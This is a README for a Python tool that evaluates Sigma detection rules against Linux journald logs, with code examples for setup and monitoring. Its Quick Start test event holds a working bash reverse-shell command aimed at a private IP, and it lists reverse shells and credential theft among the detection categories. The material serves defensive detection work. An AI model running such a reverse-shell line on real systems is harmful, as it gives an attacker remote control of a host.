# Sigma Linux Simple Backend

A lightweight, standalone implementation for Sigma rule evaluation when the full pySigma backend ecosystem isn't available or when you need a simple, dependency-light solution.

**Repository**: https://github.com/texasbe2trill/sigma-linux-backend

## Features

- **Two Dependencies**: Uses only Python standard library and psutil & pyYAML
- **Configurable Restrictiveness**: Four levels from permissive to ultra-restrictive
- **MITRE ATT&CK Integration**: Automatic extraction of tactics and techniques
- **Real Sigma Rules**: Support for loading actual Sigma rule files
- **Mock Rules**: Built-in test rules for development and testing
- **Field Mapping**: Configurable field mappings for different log formats
- **False Positive Prevention**: Smart filtering to reduce noise

## Installation

### Option 1: Clone Repository (Recommended)

```bash
git clone https://github.com/texasbe2trill/sigma-linux-backend.git
cd sigma-linux-backend

# Test immediately
python sigma_simple_backend.py
python tests/test_detection.py
```

### Option 2: Download Single File

```bash
wget https://raw.githubusercontent.com/texasbe2trill/sigma-linux-backend/main/sigma_simple_backend.py
```

### Requirements

- Python 3.6+
- PyYAML (optional, for loading real Sigma rules: `pip install pyyaml`)

## Quick Start

```python
from sigma_simple_backend import SimpleEvalBackend, RestrictivenessLevel, MockRuleCollection

# Initialize backend
backend = SimpleEvalBackend(restrictiveness=RestrictivenessLevel.RESTRICTIVE)

# Load rules (mock for testing, real for production)
rule_collection = MockRuleCollection()
compiled_rules = backend.compile(rule_collection)

# Test event
test_event = {
    "MESSAGE": "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
    "_COMM": "bash",
    "_CMDLINE": "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"
}

# Check for threats
for rule_func in compiled_rules:
    alert = backend.test_rule_against_event(rule_func, test_event)
    if alert:
        print(f"🚨 {alert.rule_title} (Severity: {alert.severity})")
```

## Using Real Sigma Rules

### Download Official Sigma Rules

```bash
# Get official Sigma rules
git clone https://github.com/SigmaHQ/sigma.git

# Install PyYAML for rule loading
pip install pyyaml

# Use with the backend
python examples/real_sigma_rules.py --download-rules
python examples/real_sigma_rules.py --live-monitor
```

### Load Custom Rules

```python
import yaml
from sigma_simple_backend import SimpleEvalBackend

class SigmaRuleLoader:
    def __init__(self):
        self.rules = []

    def load_rules_directory(self, rules_dir):
        import glob, os
        for rule_file in glob.glob(os.path.join(rules_dir, "**/*.yml"), recursive=True):
            with open(rule_file, 'r') as f:
                rule_data = yaml.safe_load(f)
                if rule_data:
                    self.rules.append(self._convert_rule(rule_data))

    def _convert_rule(self, rule_data):
        # Convert YAML rule to backend format
        return type('Rule', (), rule_data)()

# Usage
loader = SigmaRuleLoader()
loader.load_rules_directory("sigma/rules/linux/")

backend = SimpleEvalBackend()
compiled_rules = backend.compile(loader)
```

## Restrictiveness Levels

| Level                 | Description                                | Use Case                             |
| --------------------- | ------------------------------------------ | ------------------------------------ |
| **ULTRA_RESTRICTIVE** | Only confirmed malicious activity          | Production (minimal false positives) |
| **RESTRICTIVE**       | High-confidence threats only               | Most production environments         |
| **BALANCED**          | Good detection, manageable false positives | Development and testing              |
| **PERMISSIVE**        | Broad detection coverage                   | Research and threat hunting          |

## Examples

The repository includes comprehensive examples:

```bash
# Basic usage patterns
python examples/basic_usage.py

# Real-time system monitoring
python examples/journald_integration.py

# Custom log format processing
python examples/custom_log_format.py

# Real Sigma rules integration
python examples/real_sigma_rules.py --download-rules
```

## Detection Categories

Built-in patterns detect:

- **Reverse Shells**: bash, netcat, Python, Perl reverse shells
- **Privilege Escalation**: sudo exploits, setuid manipulation
- **Credential Theft**: shadow file access, SSH key theft
- **Network Attacks**: port scanning, reconnaissance
- **Malware**: known malicious tools and backdoors

## Production Usage

### System Log Monitoring

```python
import json, subprocess
from sigma_simple_backend import SimpleEvalBackend, MockRuleCollection

def monitor_system():
    backend = SimpleEvalBackend(restrictiveness=RestrictivenessLevel.RESTRICTIVE)
    compiled_rules = backend.compile(MockRuleCollection())

    # Monitor journald logs
    process = subprocess.Popen(["journalctl", "-o", "json", "-f"],
                              stdout=subprocess.PIPE, text=True)

    for line in process.stdout:
        try:
            event = json.loads(line.strip())
            for rule_func in compiled_rules:
                alert = backend.test_rule_against_event(rule_func, event)
                if alert:
                    print(f"🚨 {alert.rule_title}: {event.get('MESSAGE', '')[:100]}...")
        except json.JSONDecodeError:
            continue

if __name__ == "__main__":
    monitor_system()
```

### Custom Field Mappings

```python
# Map your log format to Sigma fields
custom_mappings = {
    "process.name": "ProcessName",
    "process.command_line": "CommandLine",
    "user.name": "UserName"
}

backend = SimpleEvalBackend(field_mappings=custom_mappings)
```

## API Reference

### SimpleEvalBackend

```python
backend = SimpleEvalBackend(
    restrictiveness=RestrictivenessLevel.BALANCED,
    field_mappings=None
)

# Methods
compiled_rules = backend.compile(rule_collection)
alert = backend.test_rule_against_event(rule_function, event)
```

### Alert Object

```python
alert.rule_title        # Rule name
alert.rule_id          # Unique identifier
alert.severity         # critical, high, medium, low
alert.description      # Rule description
alert.event_data       # Original event
alert.mitre_tactics    # MITRE ATT&CK tactics
alert.mitre_techniques # MITRE ATT&CK techniques
```

## Performance

- **Memory**: Minimal footprint, only stores compiled functions
- **CPU**: Lightweight regex pattern matching
- **Throughput**: Thousands of events per second
- **Latency**: Sub-millisecond rule evaluation

## Limitations

- Supports basic Sigma rule patterns (not all advanced features)
- Manual field mapping required for custom log formats
- Not optimized for extremely high-volume environments (>100k events/sec)

## Contributing

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/improvement`)
3. Add tests for new functionality
4. Submit a pull request

## License

MIT License - see [LICENSE](LICENSE) file for details.

## Support

- **Issues**: [GitHub Issues](https://github.com/texasbe2trill/sigma-linux-backend/issues)
- **Documentation**: See [docs/](docs/) directory
- **Examples**: See [examples/](examples/) directory

---

**Note**: This is a simplified backend for environments where the full pySigma ecosystem isn't available. For complex Sigma rules, consider the official [pySigma backends](https://github.com/SigmaHQ/pySigma).
